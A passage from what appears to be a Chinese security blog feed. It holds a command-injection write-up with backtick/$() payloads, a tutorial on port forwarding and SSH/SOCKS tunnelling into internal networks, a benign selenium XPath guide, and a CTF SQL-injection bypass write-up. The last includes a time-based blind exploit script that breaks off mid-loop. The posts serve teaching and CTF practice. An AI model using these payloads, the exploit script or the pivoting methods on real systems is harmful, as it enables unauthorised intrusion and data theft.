<li>分析<code>logContentNewest.jsp</code>和被调用的sh脚本，得知<code>path</code>参数最终会传入sh脚本的<code>FILE_PATH</code>变量，然后调用下面的判断逻辑。从下面代码我们可以看到，函数的功能是判断<code>FILE_PATH</code>变量的值是否存在，而这个变量的值目前是可控的<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-31-00.png"></li>
<li>最初想通过添加双引号闭合if条件判断参数注入命令，没有成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload： &#x2F;etc&#x2F;passwd&quot; ];ls;then echo 1;fi;if [ -e &quot;123.txt;</span><br></pre></td></tr></table></figure>
<img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-31-44.png"></li>
<li>从上图可以看到，payload的双引号不见了，在自己的Linux测试一下，发现bash在这种情况下会过滤双引号，因此排除了存在过滤双引号的可能<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-32-11.png"></li>
<li>经过多次测试，最终可用反引号<code>`</code>或者<code>$()</code>进行命令执行，如<code>ifconfig</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&quot;&#96;ifconfig&#96;&quot;</span><br></pre></td></tr></table></figure></li>
<li>命令结果的回显是因为判断不存在<code>FILA_PATH</code>文件名的文件后，会把变量值返回，其源码如下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;the file($FILE_PATH) dose not exist!&quot;</span><br></pre></td></tr></table></figure>
<strong>拓展知识：</strong> Linux bash中可以使用反引号<code>`</code>或者<code>$()</code>等方式将bash命令的执行结果保存到变量中，如<code>FILE_PATH=$(ifconfig)</code></li>
<li>命令执行结果显示不完整，只能看到返回的第一行的结果，没关系，可以简单优化一下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&quot;&#96;ifconfig |xargs&#96;&quot;</span><br></pre></td></tr></table></figure>
<strong>拓展知识：</strong> <code>xargs</code>可以将stdin中以空格或换行符进行分隔的数据，形成以空格分隔的参数（arguments），传递给其他命令。因为以空格作为分隔符，所以有一些文件名或者其他意义的名词内含有空格的时候，<code>xargs</code>可能会误判。简单来说，<code>xargs</code>是给其他命令传递参数的一个过滤器，是构建单行命令的重要组件之一。 但是这里仅仅只是通过<code>xargs</code>的特性让它把多行内容转换成一行来更好地显示结果，当然也可以使用其他方法来实现。<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-36-28.png"></li>
<li>再看看nmap内网扫描的结果，同样的漏洞组件在内网中还发现了很多…<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-37-07.png"></li>
</ol>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>漏洞是由于程序调用bash脚本传参时没有做过滤，通过$(cmd)这样的方式来执行命令并将结果存入变量中，在脚本判断文件不存在时会返回文件名，造成了回显。</p>
<h3 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h3><p>严格控制文件名参数值，先判断文件名或文件路径是否合法可修复漏洞。</p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
  </entry>
  <entry>
    <title>浅谈代理隧道的几种应用场景</title>
    <url>/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
    <content><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>熟练的代理转发，既可助你穿梭内网，亦可在工作生活中提供便利。理论上，任何接入互联网的计算机都是可访问的，但是如果目标主机处于内网，而我们又想和该目标主机进行通信的话，就需要借助一些端口转发工具来达到我们的目的。</p>
<h3 id="二、端口转发"><a href="#二、端口转发" class="headerlink" title="二、端口转发"></a>二、端口转发</h3><p>把端口接收到的流量转发到另外一个端口，可以是本机的端口，也可以是其它网络的端口。<br>实现原理：基于传输层协议，把socket字节流原封不动进行转发。<br>弊端：如果上层协议有校验，会出错。比如<code>HTTP协议</code>中部分WEB服务会校验host头，导致HTTP连接中断。</p>
<a id="more"></a>
<h4 id="2-1-简单端口转发"><a href="#2-1-简单端口转发" class="headerlink" title="2.1 简单端口转发"></a>2.1 简单端口转发</h4><p>域C可访问域B，不可访问域A。<code>172.16.1.1</code>把<code>172.16.2.1</code>的SSH服务<code>22</code>端口转发到自己的<code>8022</code>端口，<code>192.168.1.2</code>可通过访问<code>172.16.1.1:8022</code>端口连接<code>172.16.2.1</code>的SSH服务。<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-15-56-37.png"><br>实现方法：</p>
<ul>
<li>Windows：<code>netsh int portproxy</code>，如:<code>netsh interface portproxy add v4tov4 listenport=8022 connectport=22 connectaddress=172.16.2.1</code></li>
<li>Linux：<code>socat、iptables DNAT+SNAT</code>，如：<code>socat tcp-l:8022,reuseaddr,fork tcp:172.16.2.1:22,reuseaddr</code></li>
<li>lcx</li>
<li>ew</li>
<li>其它</li>
</ul>
<h4 id="2-2-反弹端口转发"><a href="#2-2-反弹端口转发" class="headerlink" title="2.2 反弹端口转发"></a>2.2 反弹端口转发</h4><p>局域网B内PC1无法直接访问局域网A内机器，把局域网A服务器172.16.2.1:22端口转发到公网服务器1.1.1.1:8022端口，这样可以让PC1通过公网访问该机器。<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-00-25.png"><br>实现方法：</p>
<ul>
<li>SSH远程转发</li>
<li>ngrok</li>
<li>nps</li>
<li>shootback</li>
</ul>
<h3 id="三、socks转发"><a href="#三、socks转发" class="headerlink" title="三、socks转发"></a>三、socks转发</h3><p>socks转发与端口转发类似，但是效果不同，端口转发效果只能访问单个端口的服务，socks转发可以访问整个目标网络。与VP*N效果类似，但是不能转发传输层以下的包。</p>
<h4 id="3-1-简单socks转发"><a href="#3-1-简单socks转发" class="headerlink" title="3.1 简单socks转发"></a>3.1 简单socks转发</h4><p><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-01-24.png"><br>实现方法：</p>
<ul>
<li>小飞机</li>
<li>ew</li>
<li>nps</li>
<li>reGeorg(webshell)</li>
<li>冰歇(webshell)<h4 id="3-2-反弹socks转发"><a href="#3-2-反弹socks转发" class="headerlink" title="3.2 反弹socks转发"></a>3.2 反弹socks转发</h4>socks服务器位于内网，外部机器通过公网访问反弹的socks端口来访问内网。<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-02-20.png"><br>实现方法：</li>
<li>小飞机+反弹端口</li>
<li>ew</li>
<li>nps</li>
<li>其它socks服务+反弹端口</li>
</ul>
<h3 id="四、SSH代理隧道"><a href="#四、SSH代理隧道" class="headerlink" title="四、SSH代理隧道"></a>四、SSH代理隧道</h3><h4 id="4-1-使用SSH动态端口转发"><a href="#4-1-使用SSH动态端口转发" class="headerlink" title="4.1 使用SSH动态端口转发"></a>4.1 使用SSH动态端口转发</h4><h5 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h5><p>使用工作PC访问公司内网服务器，登陆内网网站、登陆内网服务器。</p>
<h5 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接123.123.123.123:2222登陆到内网服务器A，其它内网端口未做映射<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-03-35.png"></p>
<h5 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h5><ol>
<li>工作机使用Xshell新建连接，并填好连接信息，然后打开隧道选项<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-04-10.png"></li>
<li>添加动态转发隧道<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-04-30.png"></li>
<li>这时候工作机使用浏览器设置<code>127.0.0.1:9999</code>为socks5代理，即可访问<code>172.16.1.101:80</code><br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-05-13.png"></li>
<li>如果要连接服务器B的3389端口，则需要借助<code>sockscap64</code>之类的工具打开，因为Windows远程连接客户端原生不支持代理，需要借助工具强制让它使用代理，这里不多赘述，可参考我的另一篇文章让<a href>BurpSuite使用MSF的socks4a代理</a>中<code>解决方法</code>-&gt;<code>步骤</code>-&gt;<code>1</code>中的sockscap64使用示例<h5 id="原理解释"><a href="#原理解释" class="headerlink" title="原理解释"></a>原理解释</h5>使用SSH动态端口转发，相当在远程SSH服务器启动了socks5代理服务，本地监听的<code>9999</code>端口流量将通过SSH隧道转发到SSH服务器，SSH服务器再对外发起网络请求。以上转发亦可使用<code>ssh</code>命令或者其它SSH客户端实现，具体方法可自行实验。<h5 id="出口数据流向"><a href="#出口数据流向" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-0" class="flow-chart"></div>




</li>
</ol>
<h4 id="4-2-使用SSH隧道本地转发"><a href="#4-2-使用SSH隧道本地转发" class="headerlink" title="4.2 使用SSH隧道本地转发"></a>4.2 使用SSH隧道本地转发</h4><h5 id="需求-1"><a href="#需求-1" class="headerlink" title="需求"></a>需求</h5><p>工作PC连接Windows服务器B的远程桌面。</p>
<h5 id="网络拓扑-1"><a href="#网络拓扑-1" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接<code>123.123.123.123:2222</code>登陆到内网服务器A，其它内网端口未做映射<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-08-50.png"></p>
<h5 id="操作步骤-1"><a href="#操作步骤-1" class="headerlink" title="操作步骤"></a>操作步骤</h5><ol>
<li>工作机<code>xshell</code>创建连接后，在<code>属性</code>-&gt;<code>连接</code>-&gt;<code>隧道</code>中添加<code>Local</code>类型转发<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-15-41.png"></li>
<li>这时工作机打开远程桌面客户端，通过连接<code>127.0.0.1:9999</code>端口，可连接到内网服务器B的<code>3389</code>端口<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-16-14.png"><h5 id="原理解释-1"><a href="#原理解释-1" class="headerlink" title="原理解释"></a>原理解释</h5>SSH隧道的本地转发，相当于把本地监听的<code>9999</code>端口接收到的TCP流量，通过SSH隧道转发到远程的SSH服务器A，服务器A再发起TCP连接到服务器B的3389端口。可以看到，本地转发跟动态转发有点相似，不同的是本地转发是转发了<code>一个远程端口</code>到本地，而动态转发可通过配置代理访问整个<code>远程网络</code>。<br>注意：这种方法转发<code>HTTP</code>端口一般无法成功，因为HTTP协议带有<code>Host</code>头，服务器端校验Host头后可能会重置该HTTP请求导致无法连接，如果想了解这一细节，不妨抓个包看看。</li>
</ol>
<h5 id="出口数据流向-1"><a href="#出口数据流向-1" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-1" class="flow-chart"></div>

<h4 id="4-3-使用SSH隧道远程转发"><a href="#4-3-使用SSH隧道远程转发" class="headerlink" title="4.3 使用SSH隧道远程转发"></a>4.3 使用SSH隧道远程转发</h4><h5 id="需求-2"><a href="#需求-2" class="headerlink" title="需求"></a>需求</h5><p>工作PC-B访问工作PC-A上面的MySQL数据库（3306端口）。</p>
<h5 id="网络拓扑-2"><a href="#网络拓扑-2" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-18-53.png"></p>
<h5 id="操作步骤-2"><a href="#操作步骤-2" class="headerlink" title="操作步骤"></a>操作步骤</h5><p><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-19-09.png"></p>
<h5 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h5><p>远程转发的功能刚好与本地转发相反，可以把本地监听的端口转发到远程服务器上，可用于办公区的机器需要访问工作机的本地端口时候使用，比如工作机上面配置了数据库服务，监听本地3306端口，通过转发本地<code>3306</code>端口到远程服务器A的<code>9999</code>端口上，服务器B可访问工作机的数据库应用。</p>
<p>注意：远程转发默认只能转发到SSH服务器的环回网卡（127.0.0.1），外部网络访问（如本例）需要启动<code>GatewayPorts</code>配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 编辑sshd 的配置文件&#x2F;etc&#x2F;ssh&#x2F;sshd_config，将GatewayPorts 开关打开：</span><br><span class="line">GatewayPorts yes</span><br></pre></td></tr></table></figure>

<h5 id="出口数据流向-2"><a href="#出口数据流向-2" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-2" class="flow-chart"></div>

<h3 id="五、代理链工具"><a href="#五、代理链工具" class="headerlink" title="五、代理链工具"></a>五、代理链工具</h3><p>强制程序使用代理，让一些不支持代理的工具也能使用socks代理</p>
<ul>
<li>proxychains</li>
<li>sockscap64</li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/articles/web/170970.html">内网渗透之端口转发与代理工具总结</a><br><a href="https://xz.aliyun.com/t/142">内网端口转发及穿透</a><br><a href="https://ryaninf.github.io/2019/07/11/%E8%AE%A9BURP%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/">让BurpSuite使用MSF的socks4a代理</a><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">st=>start: 工作机Firefox
e=>end: 内网服务器B（172.16.1.101:80)
op1=>operation: SSH动态转发本地监听端口（127.0.0.1:9999)
op2=>operation: SSH隧道连接服务器A（172.16.1.100:22)
st->op1->op2->e</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script><textarea id="flowchart-1-code" style="display: none">st=>start: 工作机RDP客户端
e=>end: 内网服务器B（172.16.1.101:3389)
op1=>operation: SSH动态转发本地监听端口（127.0.0.1:9999)
op2=>operation: SSH隧道连接服务器A（172.16.1.100:22)
st->op1->op2->e</textarea><textarea id="flowchart-1-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-1-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-1-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-1", options);</script><textarea id="flowchart-2-code" style="display: none">st=>start: 工作PC-B Mysql客户端
e=>end: 工作PC-A（192.168.1.100:3306)
op1=>operation: 云服务器监听端口（123.123.123.123:9999)
op2=>operation: 工作PC-A SSH客户端进程
st->op1->op2->e</textarea><textarea id="flowchart-2-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-2-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-2-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-2", options);</script></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>python selenium 操纵Chrome提取XPath</title>
    <url>/2020/08/30/python-selenium-%E6%93%8D%E7%BA%B5Chrome%E6%8F%90%E5%8F%96XPATH/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>XPath</code>是一门在<code>XML</code>文档中查找信息的语言。<code>XPath</code>用于在<code>XML</code>文档中通过元素和属性进行导航。<code>XPath</code>在爬取提取数据中非常好用，但是通过<code>Chrome</code>或者<code>Firefox</code>提取的<code>XPath</code>，经常会遇到在<code>Python lxml</code>库中提取不到数据，<strong>因为浏览器对不标准的HTML文档都有纠正功能，而<code>lxml</code>库不会</strong>，而从本地HTML文件中提取<code>XPath</code>又很不方便，所以既然<code>XPath</code>是从浏览器中提取的，那么通过<code>selenium</code>操纵<code>Chrome</code>提取<code>XPath</code>就准确很多，能省很多事。</p>
<a id="more"></a>
<h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><p><code>pip</code>安装<code>selenium</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure>
<p>要使用<code>selenium</code>操纵<code>Chrome</code>，还需要下载<code>ChromeDriver</code>，<a href="https://sites.google.com/a/chromium.org/chromedriver/home">点击下载（可能需要代理）</a>对应版本的<code>ChromeDriver</code>：<br><img data-src="/2020/08/30/python-selenium-%E6%93%8D%E7%BA%B5Chrome%E6%8F%90%E5%8F%96XPATH/2020-08-31-09-26-38.png"><br>下载后解压到项目文件夹内即可。</p>
<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用chrome打开一个本地HTML文件，然后提取xpath，因为我们通常都是先使用requests获取到请求结果，再进行xpath提取，比直接通过浏览器取HTML文件效率会高些。</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 文件位置</span></span><br><span class="line">    filename = <span class="string">r&#x27;0830.html&#x27;</span></span><br><span class="line">    <span class="comment"># chrome打开本地HTML文件，需要加上file://协议头</span></span><br><span class="line">    filepath = <span class="string">&#x27;file://&#123;&#125;&#x27;</span>.format(filename)</span><br><span class="line">    print(filepath)</span><br><span class="line">    <span class="comment"># 启用headless模式，此模式调用浏览器不会打开窗口</span></span><br><span class="line">    options = webdriver.chrome.options.Options()</span><br><span class="line">    options.headless = <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 驱动chrome</span></span><br><span class="line">    driver = webdriver.Chrome(options=options)</span><br><span class="line">    <span class="comment"># 打开本地HTML文件</span></span><br><span class="line">    driver.get(filepath)</span><br><span class="line">    <span class="comment"># 提取xpath，这里xpath只需到具体的某个标签，不能是属性</span></span><br><span class="line">    <span class="comment"># 通过 .text 获取标签文本内容</span></span><br><span class="line">    cgbianhao = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;two_pages_all&quot;]/div[1]/div[2]/table[3]/tbody/tr[&#123;&#125;]/td[3]&#x27;</span>.format(i)).text</span><br><span class="line">    cgname = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;two_pages_all&quot;]/div[1]/div[2]/table[3]/tbody/tr[&#123;&#125;]/td[4]&#x27;</span>.format(i)).text</span><br><span class="line">    cgstarttime = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;two_pages_all&quot;]/div[1]/div[2]/table[3]/tbody/tr[&#123;&#125;]/td[5]&#x27;</span>.format(i)).text</span><br><span class="line">    cgstopstime = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;two_pages_all&quot;]/div[1]/div[2]/table[3]/tbody/tr[&#123;&#125;]/td[6]&#x27;</span>.format(i)).text</span><br><span class="line">    <span class="comment"># 通过 .get_attribute() 获取属性内容</span></span><br><span class="line">    url_item = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;two_pages_all&quot;]/div[1]/div[2]/table[3]/tbody/tr[&#123;&#125;]/td[7]/a&#x27;</span>.format(i)).get_attribute(<span class="string">&quot;onclick&quot;</span>)</span><br><span class="line">    <span class="comment"># 关闭浏览器实例</span></span><br><span class="line">    driver.close()</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://sites.google.com/a/chromium.org/chromedriver/home">ChromeDriver</a><br><a href="https://www.thinbug.com/q/23900348">为什么这个xpath在python中使用lxml失败？</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>blacklist_writeup</title>
    <url>/2020/10/21/blacklist-writeup/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文为某次培训练习题解题过程，该题考察SQL注入绕过方法，难度中等。</p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><ol>
<li>观察题目，可知道本题考察SQL注入绕过，经过测试，发现拦截’=’、’and’、’or’、’,’、空格</li>
<li>‘=’ 可用’like’代替</li>
<li>‘and’ 可用’&amp;’代替</li>
<li>‘or’ 可用’|’代替</li>
<li>空格可用注释绕过<code>/**/</code></li>
<li>逗号可用<code>from a for b</code>绕过，但是仅限于函数内逗号，所以本题不能使用<code>union select 1,flag from flag</code>来直接获取到结果（误，可以使用<code>join</code>绕过，见方法二）<br>以下为以前使用过的一个绕过逗号拦截的payload，我们可以在它的基础上进行修改：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and (select * from (select case when (substring((select user()) from 1 for 1)&#x3D;&#39;c&#39;) then sleep(3) else 0 end)A) -- </span><br></pre></td></tr></table></figure></li>
<li>ctf注入题的flag通常在flag表，所以我们直接跑这个表了，所以把payload修改为如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and (select * from (select case when (substring((select * from flag) from 1 for 1)&#x3D;&#39;c&#39;) then sleep(3) else 0 end)A) -- </span><br></pre></td></tr></table></figure></li>
<li>因为’for’ 里面的’or’也会拦截，所以换成这种写法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from a  &#x2F;&#x2F;表示从最后一个字母取，取a个字母，如果越界则为空值</span><br><span class="line">select substring((select user()) from -14);</span><br></pre></td></tr></table></figure>
所以payload修改为：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and (select * from (select case when (ascii(substring((select * from flag) from -1))&#x3D;2) then sleep(3) else 0 end)A) -- </span><br></pre></td></tr></table></figure>
这里的-1表示截取倒数第一个字符，2与该字符的ASCII码进行比对</li>
<li>然后替换<code>and</code> 为<code>&amp;</code>，<code>=</code>为<code>like</code>，<code> </code>（空格）为<code>/**/</code>，因为最后的<code>--</code>注释符替换成<code>/**/--/**/</code>的话会失效，所以使用<code>#</code>注释，最终payload：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;&#x2F;**&#x2F;&#x2F;**&#x2F;&amp;&#x2F;**&#x2F;(select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;(ascii(substring((select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)&#x2F;**&#x2F;from&#x2F;**&#x2F;-1))&#x2F;**&#x2F;like&#x2F;**&#x2F;125)&#x2F;**&#x2F;then&#x2F;**&#x2F;sleep(3)&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end)A)#</span><br></pre></td></tr></table></figure>
我们知道flag字符串最终位为<code>&#125;</code>，其ASCII码值为<code>125</code>，所以测试这位的值来验证我们的payload，可以看到确实延迟了3s：<br><img data-src="/2020/10/21/blacklist-writeup/2020-10-21-13-47-49.png"><br>如果修改为错误的值则不会：<br><img data-src="/2020/10/21/blacklist-writeup/2020-10-21-13-48-34.png"></li>
<li>那么我们就可以根据上面的payload编写最终exp了：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">keynum, chrord</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://x.x.x.x:xxxxx/?id=1&#x27;/**/%26/**/(select/**/*/**/from/**/(select/**/case/**/when/**/(ascii(substring((select/**/*/**/from/**/flag)/**/from/**/-&#123;&#125;))/**/like/**/&#123;&#125;)/**/then/**/sleep(2)/**/else/**/0/**/end)A)%23&quot;</span>.format(keynum, chrord)</span><br><span class="line">    <span class="comment"># print(burp0_url)</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;o19hhhgs7vncjnq8ffmlubp3h1&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flagchars = string.ascii_lowercase + string.digits + <span class="string">&#x27;&#123;&#125;_-&#x27;</span></span><br><span class="line">flagchars_ordlist = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> flagchars]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pre_chr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">43</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagchars_ordlist:</span><br><span class="line">        c = 